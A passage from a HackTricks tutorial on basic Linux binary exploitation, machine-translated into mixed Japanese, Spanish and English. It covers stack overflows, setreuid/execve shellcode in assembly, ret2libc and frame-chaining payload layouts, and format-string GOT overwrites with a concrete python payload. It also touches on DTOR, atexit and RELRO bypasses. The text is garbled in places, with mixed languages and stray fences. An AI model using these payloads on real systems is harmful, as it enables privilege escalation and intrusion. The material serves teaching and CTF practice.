# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する。**

</details>

## **1.STACK OVERFLOWS**

> buffer overflow, buffer overrun, stack overrun, stack smashing

Segmentation fault or segfault: When trying to access a memory address that has not been assigned to the process.

To obtain the address of a function within a program, you can:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execveへの呼び出し

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Generates an executable with the assembly code, and we can extract the opcodes using **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
Para confirmar que las llamadas al sistema se están realizando correctamente, compile el programa anterior y verifique que las llamadas al sistema aparecen en **strace ./PROGRAMA_COMPILADO**

When creating shellcodes, a trick can be used. The first instruction is a jump to a call. The call executes the original code and pushes the EIP onto the stack. After the call instruction, we have placed the necessary string, so with that EIP we can point to the string and continue executing the code.

EJ **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**/bin/shを使用した基本的なESP:**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**  
EJ FNSTENV 命令は、スタック上の環境を保存するために使用されます。
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

プロセスに関連付けられたメモリページをスキャンし、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードをインジェクトするための小さなスペースしか持っていない場合に便利です。

**Polymorphic Shellcodes**

これは、暗号化されたシェルで、それを復号化してジャンプする小さなコードを持っており、Call-Popトリックを使用しています。これは**シーザー暗号化の例**です。
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Frame Pointer (EBP) の攻撃**

EBP を変更できるが EIP を変更できない状況で有用です。

関数から抜ける際に次のアセンブリコードが実行されることが知られています：
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, si se puede modificar el EBP al salir de una función (fvuln) que ha sido llamada por otra función, cuando la función que llamó a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde esté la dirección de la shellcode + 4 (hay que sumarle 4 por el pop). Así, al salir de la función, se meterá en ESP el valor de &(\&Shellcode)+4, con el pop se le restará 4 al ESP y este apuntará a la dirección de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la dirección de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. Métodos return to Libc**

Método útil cuando el stack no es ejecutable o deja un buffer muy pequeño para modificar.

El ASLR provoca que en cada ejecución las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este método puede no ser efectivo en ese caso. Para servidores remotos, como el programa está siendo ejecutado constantemente en la misma dirección sí puede ser útil.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la función limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la función llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la dirección de la instrucción system de libc y se le pasa como argumento el string “/bin/sh”, normalmente desde una variable de entorno. Además, se usa la dirección a la función exit para que una vez que no se requiera más la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** —> Da la dirección de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** —> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedaría:

“A” \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentación) + Dirección de **system** (sobreescribirá el EIP) + Dirección de **exit** (al salir de system(“/bin/sh”) se llamará a esta función pues los primero 4bytes del stack son tratados como la siguiente dirección del EIP a ejecutar) + Dirección de “**/bin/sh**” (será el parámetro pasado a system)

De esta forma el EIP se sobreescribirá con la dirección de system la cual recibirá como parámetro el string “/bin/sh” y al salir de este ejecutará la función exit().

Es posible encontrarse en la situación de que algún byte de alguna dirección de alguna función sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha función pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la función directamente (por ejemplo con > x/8i system-4).

Este método funciona pues al llamar a una función como system usando el opcode **ret** en vez de **call**, la función entiende que los primeros 4bytes serán la dirección **EIP** a la que volver.

Una técnica interesante con este método es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra técnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o servía en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecución). Con este ataque se podría volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

Basándonos en la técnica anterior, esta forma de exploit consiste en:\
Relleno + \&Función1 + \&pop;ret; + \&arg\_fun1 + \&Función2 + \&pop;ret; + \&arg\_fun2 + …

De esta forma se pueden encadenar funciones a las que llamar. Además, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar dirección a un sitio con opcodes: pop, pop, pop, pop, ret —> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecución de varias funciones a través del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2º EBP\_falso + la función a ejecutar: (\&system() + \&leave;ret + &“/bin/sh”)
* En el EIP ponemos de dirección una función &(leave;ret)

Iniciamos la shellcode con la dirección a la siguiente parte de la shellcode, por ej: 2ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/sh”

el 2ºEBP sería: 3ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/ls”

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguirá una shellcode fácilmente divisible por pequeños trozos de memoria.

(Se encadena la ejecución de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.Métodos complementarios**

**Ret2Ret**

Útil para cuando no se puede meter una dirección del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicación de la shellcode. Pero, la función vulnerable acepte un parámetro (la shellcode irá aquí).

De esta forma, al cambiar el EIP por una dirección a un **ret**, se cargará la siguiente dirección (que es la dirección del primer argumento de la función). Es decir, se cargará la shellcode.

El exploit quedaría: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la dirección al parámetro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la dirección donde estaba guardada la shellcode imposibilitando esta técnica. Es decir, la dirección que pasan a la función como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
**Ret2PopRet**
```
**Muratのテクニック**

Linuxでは、すべてのプログラムは0xbfffffffからマップされます。

Linuxの新しいプロセスのスタックがどのように構築されるかを見ると、プログラムがシェルコードだけの環境で起動されるようにエクスプロイトを開発できます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

これにより、シェルコードが含まれる環境変数のアドレスを簡単に取得できます。

これは、execle関数が望ましい環境変数のみを持つ環境を作成できるために可能です。

**ESPへのジャンプ：Windowsスタイル**

ESPが常にスタックの先頭を指しているため、このテクニックはEIPを**jmp esp**または**call esp**へのアドレスに置き換えることで構成されます。これにより、EIPの上書き後にshellcodeが保存され、**ret**を実行した後、ESPは次のアドレスを指すようになり、ちょうどshellcodeが保存されている場所になります。

WindowsまたはLinuxでASLRが有効でない場合、共有オブジェクトに保存された**jmp esp**または**call esp**を呼び出すことができます。ASLRが有効な場合、脆弱なプログラム内で検索することができます。

さらに、EIPの破損後にshellcodeを配置できるため、関数の途中に配置するのではなく、スタックの中央に配置することで、関数内で実行されるpushやpop命令がshellcodeに影響を与えないようにすることができます。

同様に、関数がshellcodeが保存されているアドレスを返すことを知っている場合、**call eax**または**jmp eax (ret2eax)**を呼び出すことができます。

**整数オーバーフロー**

この種のオーバーフローは、変数が渡される数値をサポートする準備ができていないときに発生します。符号付きと符号なしの変数の混乱による可能性があります。
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
**未初期化変数**

未初期化変数の取りうる値はわからず、それを観察することが興味深いかもしれません。前の関数の変数が取っていた値を取る可能性があり、攻撃者によって制御されるかもしれません。

## **フォーマット文字列**

C言語では、**`printf`** は文字列を**出力**するために使用できる関数です。この関数が期待する**最初のパラメータ**は、**フォーマッターを含む生のテキスト**です。**次のパラメータ**は、生のテキストから**フォーマッターを置き換える値**です。

攻撃者のテキストがこの関数の最初の引数として入力されると、脆弱性が発生します。攻撃者は、**printfフォーマット文字列の機能を悪用**して、**任意のアドレスに任意のデータを書き込む**ことができます。これにより、**任意のコードを実行**することができます。

フォーマッター：
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**は、指定されたアドレスに書き込まれたバイト数を表します。書き込む必要がある16進数のバイト数だけ書き込むことで、任意のデータを書き込むことができます。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

これは、プログラムで使用される外部関数へのアドレスを含むテーブルです。

このテーブルへのアドレスを取得するには、**`objdump -s -j .got ./exec`**を使用します。

![](<../../.gitbook/assets/image (619).png>)

GEFで実行可能ファイルを読み込んだ後、**GOT**に含まれる**関数**を確認できます: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEFを使用してデバッグセッションを開始し、**`got`**を実行してgotテーブルを表示できます:

![](<../../.gitbook/assets/image (621).png>)

バイナリ内のGOTには、後で実行される関数のアドレスまたは関数アドレスをロードするPLTセクションへのアドレスが含まれています。このエクスプロイトの目標は、後で実行される関数のGOTエントリを、`system`関数のPLTのアドレスで上書きすることです。理想的には、制御可能なパラメータを使用して呼び出される関数のGOTを上書きします（つまり、システム関数に送信されるパラメータを制御できます）。

スクリプトで`system`が使用されていない場合、システム関数はGOTにエントリがありません。このシナリオでは、まず`system`関数のアドレスをリークする必要があります。

**Procedure Linkage Table**は、ELFファイル内の読み取り専用テーブルであり、解決が必要なすべてのシンボルを格納しています。これらの関数のいずれかが呼び出されると、GOTはPLTにフローをリダイレクトし、関数のアドレスを解決してGOTに書き込みます。\
その後、そのアドレスに対して次に呼び出しが行われると、関数は解決する必要がなく直接呼び出されます。

PLTのアドレスは、**`objdump -j .plt -d ./vuln_binary`**で確認できます。

### Exploit Flow

前述のように、目標は後で呼び出される関数のGOTテーブル内のアドレスを上書きすることです。理想的には、実行可能セクションに配置されたシェルコードのアドレスを設定できますが、実行可能セクションにシェルコードを書き込むことはほとんど不可能です。\
したがって、異なるオプションは、ユーザーから引数を受け取る関数を上書きし、それを`system`関数に指すことです。

アドレスを書き込むには、通常2つのステップが実行されます: **最初にアドレスの2バイトを書き込み**、その後残りの2バイトを書き込みます。これには**`$hn`**が使用されます。

**HOB**はアドレスの上位2バイトを指します\
**LOB**はアドレスの下位2バイトを指します

したがって、フォーマット文字列の動作方法により、\[HOB、LOB]のうち**小さい方を最初に書き込み**、その後もう一方を書き込む必要があります。

HOB < LOBの場合\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOBの場合\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### Format String Exploit Template

GOTを使用してフォーマット文字列をエクスプロイトするための**テンプレート**は、こちらで見つけることができます:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

基本的に、これはプログラムが終了する前に呼び出される**関数が含まれる構造体**です。これは、**アドレスにジャンプしてシェルコードを呼び出す**ことができる場合や、フォーマット文字列を2回目にエクスプロイトするために再びmainに戻る必要がある場合に興味深いです。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意してください、これは**永久ループを作成しません**。なぜなら、mainに戻るとキャナリが気づき、スタックの末尾が破損して関数が再度呼び出されなくなるからです。そのため、これにより脆弱性の**1回の実行を追加**できます。

### **コンテンツをダンプするためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
たとえば、次の状況では、**フラグを指すスタック内のローカル変数**があります。**メモリ**のどこに**フラグへのポインタ**があるかを**見つける**と、**printf**がその**アドレス**に**アクセス**して**フラグ**を**表示**できます。

したがって、フラグは**0xffffcf4c**にあります

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目**のパラメータにあることがわかります：

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすると、フラグを取得できます：

![](<../../.gitbook/assets/image (624).png>)

**以前のエクスプロイト**に続いて**コンテンツをリーク**できることに気づいた場合、**`printf`**への**ポインタ**を**実行可能ファイルがロードされるセクション**に**設定**して、それを**完全にダンプ**することができます！

### **DTOR**

{% hint style="danger" %}
現在、dtorセクションを持つバイナリを見つけるのは非常に**珍しい**です。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
**`__DTOR_END__`**に**シェルコード**の**アドレス**を**書き込む**ことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR** セクションは値 `ffffffff` と `00000000` の間にあります。したがって、これらの値だけを見ると、**関数が登録されていない**ことを意味します。そのため、**`00000000`** を **シェルコードのアドレス** で **上書き** して実行します。

### **フォーマット文字列を使用したバッファオーバーフロー**

**sprintf** はフォーマットされた文字列を変数に**移動**します。したがって、文字列の**フォーマット**を悪用して、コピーされるコンテンツが含まれる変数で**バッファオーバーフロー**を引き起こすことができます。\
例えば、ペイロード `%.44xAAAA` は変数に **44B+"AAAA" を書き込み**、これによりバッファオーバーフローが発生する可能性があります。

### **\_\_atexit 構造体**

{% hint style="danger" %}
現在、これを悪用するのは非常に**珍しい**です。
{% endhint %}

**`atexit()`** は、**他の関数がパラメータとして渡される関数**です。これらの**関数**は、**`exit()` の実行**または **main の戻り**時に**実行**されます。\
たとえば、これらの**関数**の**アドレス**をシェルコードを指すように**変更**できれば、**プロセスを制御**できますが、現在はより複雑です。\
現在、**実行される関数のアドレス**はいくつかの構造体の背後に隠されており、最終的に指すアドレスは関数のアドレスではなく、**XOR とランダムキーで暗号化**されています。そのため、現在、この攻撃ベクトルは **x86** および **x64\_86** では**あまり有用ではありません**。\
**暗号化関数**は **`PTR_MANGLE`** です。 **m68k、mips32、mips64、aarch64、arm、hppa** などの**他のアーキテクチャ**は、**入力と同じものを返す**ため、このベクトルによって攻撃される可能性があります。

### **setjmp() と longjmp()**

{% hint style="danger" %}
現在、これを悪用するのは非常に**珍しい**です。
{% endhint %}

**`Setjmp()`** は、**コンテキスト（レジスタ）を保存**できます。\
**`longjmp()`** は、**コンテキストを復元**できます。\
保存されるレジスタは、`EBX、ESI、EDI、ESP、EIP、EBP` です。\
問題は、EIP と ESP が **`PTR_MANGLE`** 関数によって渡されるため、この攻撃に対して脆弱なアーキテクチャは上記と同じです。\
エラー回復や割り込みに役立ちます。\
ただし、他のレジスタは保護されていないという情報もありますので、関数内で `call ebx`、`call esi`、`call edi` がある場合、制御を取得できます。また、ESP を変更して EBP を変更することもできます。

**VTable と VPTR in C++**

各クラスには、メソッドへの**ポインタの配列**である **Vtable** があります。

各クラスのオブジェクトには、そのクラスの配列への**ポインタ**である **VPtr** があります。 VPtr は各オブジェクトのヘッダーの一部です。したがって、VPtr の**上書き**が達成されると、実行される関数がシェルコードに移動するように**変更**できます。

## **Preventive Measures and Evasions**

**Return-into-printf**

これは、バッファオーバーフローをフォーマット文字列エラーに変換する技術です。 EIP を printf 関数を指すように置き換え、操作されたフォーマット文字列を引数として渡すことで、プロセスの状態に関する値を取得できます。

**Library Attacks**

ライブラリは、16ビットのランダム性を持つ位置にあります = 65636 の可能なアドレスがあります。脆弱なサーバーが fork() を呼び出すと、メモリアドレス空間が子プロセスにコピーされ、そのままになります。したがって、libc の usleep() 関数に "16" を引数として渡す brute force を試みることができ、通常よりも長い応答時間がかかる場合、その関数が見つかります。その関数の場所がわかれば、delta\_mmap を取得し、他の値を計算できます。

ASLR が機能していることを確認する唯一の方法は、64ビットアーキテクチャを使用することです。そこでは、brute force 攻撃はありません。

### Relro

**Relro (Read only Relocation)** は、メモリの権限に NX と似た影響を与えます。違いは、NX ではスタックを実行可能にしますが、RELRO は**特定のものを読み取り専用**にして書き込むことができないようにします。これが障害となる一般的な方法は、後述する **`got` テーブルの上書き**を防ぐことです。`got` テーブルには、libc 関数のアドレスが格納されており、バイナリがアドレスを知っていてそれを呼び出すことができます。RELRO がある場合とない場合のバイナリの `got` テーブルエントリのメモリ権限を見てみましょう。

RELRO あり：
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Relro なし:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
バイナリ**relroなし**の場合、`fgets`の`got`エントリアドレスが`0x404018`であることがわかります。メモリマッピングを見ると、`0x404000`から`0x405000`の間にあることがわかります。これには**権限`rw`**があり、読み書きができます。バイナリ**relroあり**の場合、バイナリの実行時の`got`テーブルアドレス（pieが有効になっているため、このアドレスは変わります）は`0x555555557fd0`です。そのバイナリのメモリマッピングでは、`0x0000555555557000`から`0x0000555555558000`の間にあり、メモリ**権限`r`**があり、読み取りのみが可能です。

では、**バイパス**は何でしょうか？私が通常使用するバイパスは、relroによって読み取り専用になるメモリ領域に書き込まないようにし、**コード実行を取得する別の方法を見つける**ことです。

これが起こるためには、バイナリが実行前に関数のアドレスを知っている必要があります：

* 遅延バインディング：関数のアドレスは、関数が最初に呼び出されるときに検索されます。したがって、実行中にGOTに書き込み権限が必要です。
* 今すぐバインド：関数のアドレスは実行の開始時に解決され、その後、.got、.dtors、.ctors、.dynamic、.jcrなどの重要なセクションに読み取り専用権限が与えられます。`` `**``-z relro`**`y`**`-z now\`\*\*

プログラムが今すぐバインドを使用しているかどうかを確認するには、次の操作を行います：
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando el binario es cargado en memoria y una función es llamada por primera vez se salta a la PLT (Procedure Linkage Table), de aquí se realiza un salto (jmp) a la GOT y descubre que esa entrada no ha sido resuelta (contiene una dirección siguiente de la PLT). Por lo que invoca al Runtime Linker o rtfd para que resuelva la dirección y la guarde en la GOT.

Cuando se llama a una función se llama a la PLT, esta tiene la dirección de la GOT donde se almacena la dirección de la función, por lo que redirige el flujo allí y así se llama a la función. Sin embargo, si es la primera vez que se llama a la función, lo que hay en la GOT es la siguiente instrucción de la PLT, por lo tanto el flujo sigue el código de la PLT (rtfd) y averigua la dirección de la función, la guarda en la GOT y la llama.

Al cargar un binario en memoria el compilador le ha dicho en qué offset tiene que situar datos que se deben de cargar cuando se corre el programa.

Lazy binding —> La dirección de la función se busca la primera vez que se invoca dicha función, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ahí y no haya que volver a buscarla.

